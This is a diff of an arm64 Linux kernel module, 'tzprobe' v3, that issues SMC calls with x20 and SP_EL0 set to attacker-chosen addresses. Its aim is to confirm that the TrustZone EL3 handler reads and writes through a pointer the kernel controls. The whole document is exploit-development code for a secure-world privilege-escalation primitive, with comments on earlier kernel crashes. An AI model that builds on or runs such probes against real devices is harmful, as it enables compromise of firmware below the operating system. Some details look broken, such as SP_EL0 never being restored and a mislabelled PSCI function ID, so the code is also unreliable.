@@ -1,73 +1,89 @@
-// tzprobe v2 - test whether the TrustZone SMC handler uses EL1's x20 as a pointer.
+// tzprobe v3 - determine whether the TrustZone SMC handler uses EL1's x20 as a pointer,
+// without faulting the kernel.
 //
-// v1 panicked because it wrote SP_EL0 to a kernel vzalloc address, which is not
-// accessible at EL0, and the fault returned through the SMC path. v2 leaves
-// SP_EL0 completely alone and only manipulates x20.
+// v1 and v2 both faulted at 0xffffffffffffffff (EC 0x25 DABT, FSC 0x06 level-2 translation
+// fault). v1 wrote SP_EL0 to a kernel vzalloc address, which is self-inflicted since EL0
+// cannot access vmalloc memory. v2 never touched SP_EL0 and faulted identically, which points
+// at TZ dereferencing an SP_EL0 that is uninitialised in this context.
 //
-// Static basis: in tz.mbn the EL3 dispatcher dereferences x20 on every path, and
-// no handler ever assigns x20 - it is restored from the saved frame slot where
-// the generic entry stub stored EL1's x20. If true, EL3 reads and writes through
-// a pointer the lower EL fully controls.
+// v3 therefore gives the SMC a *real user-space* address for SP_EL0. A user virtual address
+// is valid in both EL0 and EL1 because they share TTBR0, so whatever TZ dereferences will
+// resolve. x20 gets the kernel alias of the same page, so if TZ uses x20 as a pointer we see
+// the write without EL0 permission getting in the way.
 
 #include <linux/module.h>
 #include <linux/init.h>
-#include <linux/vmalloc.h>
+#include <linux/mm.h>
+#include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/utsname.h>
+#include <linux/uaccess.h>
+#include <asm/pgtable.h>
 
 #define POISON 0xAA
 
-/* Issue SMC with x20 forced to `ptr`, leaving every other register alone. */
-static unsigned long smc_with_x20(unsigned long fid, unsigned long ptr, unsigned long in1)
+/* Issue SMC with x20 = kptr and SP_EL0 = uptr. */
+static unsigned long smc_x20_sp0(unsigned long fid, unsigned long kptr, unsigned long uptr)
 {
-    unsigned long x0 = fid, x1 = in1, x2 = 0, x3 = 0;
+    unsigned long x0 = fid, x1 = 0, x2 = 0, x3 = 0;
 
-    /* The pointer must be moved into x20 by the asm itself. A local
-     * "register ... x20" variable is not a reliable way to do this: if it is not
-     * referenced by the asm, the compiler simply drops it (clang warned
-     * "unused variable"), and the register would keep whatever it held. */
     asm volatile(
+        "msr sp_el0, %4\n\t"
         "mov x20, %3\n\t"
         "smc #0"
         : "+r"(x0), "+r"(x1), "+r"(x2), "+r"(x3)
-        : "r"(ptr)
+        : "r"(kptr), "r"(uptr)
         : "x20", "memory");
     return x0;
 }
 
-static void probe(const char *label, unsigned long fid, unsigned long in1)
+static void probe(const char *label, unsigned long fid)
 {
-    unsigned long *buf = vzalloc(PAGE_SIZE);
-    unsigned long before0, before1, ret;
+    unsigned long uptr, kptr, ret, k0, k1;
+    unsigned long *kbuf;
+    struct page *page;
 
-    if (!buf) { pr_err("tzprobe: vzalloc failed\n"); return; }
+    /* A page from this process's own user stack: already mapped and writable,
+     * and - crucially - a *user* virtual address, so it is valid at EL0 and EL1
+     * alike because they share TTBR0. Whatever TZ dereferences will resolve,
+     * which is what v1 and v2 got wrong. */
+    uptr = current->mm->start_stack - 0x2000;
+    uptr &= ~0xfffUL;
 
-    memset(buf, POISON, PAGE_SIZE);
-    before0 = buf[0]; before1 = buf[1];
+    if (get_user_pages_fast(uptr, 1, 0, &page) != 1) {
+        pr_err("tzprobe: get_user_pages_fast failed for %016lx\n", uptr);
+        return;
+    }
+    kbuf = page_address(page);
+    kptr = (unsigned long)kbuf;
+    if (!kbuf) { pr_err("tzprobe: page_address NULL\n"); put_page(page); return; }
 
-    ret = smc_with_x20(fid, (unsigned long)buf, in1);
+    kbuf[0] = POISON; kbuf[1] = POISON;
+    k0 = kbuf[0]; k1 = kbuf[1];
 
-    pr_info("tzprobe: %s fid=0x%lx in1=0x%lx ret=0x%016lx buf=%016lx\n",
-            label, fid, in1, ret, (unsigned long)buf);
-    pr_info("tzprobe:   [0] before=0x%016lx after=0x%016lx %s\n",
-            before0, buf[0], buf[0] != before0 ? "<== CHANGED" : "");
-    pr_info("tzprobe:   [1] before=0x%016lx after=0x%016lx %s\n",
-            before1, buf[1], buf[1] != before1 ? "<== CHANGED" : "");
+    ret = smc_x20_sp0(fid, kptr, uptr);
 
-    if (buf[0] != before0 || buf[1] != before1)
-        pr_info("tzprobe: VERDICT[%s] = EL3 WROTE THROUGH x20 -> x20 model CONFIRMED\n", label);
+    pr_info("tzprobe: %-9s fid=0x%lx ret=0x%016lx kptr=%016lx uptr=%016lx\n",
+            label, fid, ret, kptr, uptr);
+    pr_info("tzprobe:   x20 target [0] %016lx -> %016lx %s\n", k0, kbuf[0],
+            kbuf[0] != k0 ? "<== CHANGED" : "");
+    pr_info("tzprobe:   x20 target [1] %016lx -> %016lx %s\n", k1, kbuf[1],
+            kbuf[1] != k1 ? "<== CHANGED" : "");
+
+    if (kbuf[0] != k0 || kbuf[1] != k1)
+        pr_info("tzprobe: VERDICT[%s] = EL3 wrote through x20 -> x20 model CONFIRMED\n", label);
     else
-        pr_info("tzprobe: VERDICT[%s] = no write observed\n", label);
+        pr_info("tzprobe: VERDICT[%s] = no write through x20\n", label);
 
-    vfree(buf);
+    put_page(page);
 }
 
 static int __init tzprobe_init(void)
 {
     pr_info("tzprobe: loaded on %s\n", utsname()->release);
-    probe("psci_version", 0xd0f1, 0);   /* read-only PSCI query */
-    probe("unknown",     0x0000, 0);
-    probe("zero-fid-1",  0x0001, 0);
+    probe("psci_ver", 0xd0f1);   /* read-only PSCI_VERSION query */
+    probe("fid_0",    0x0000);
+    probe("fid_1",    0x0001);
     return 0;
 }
 
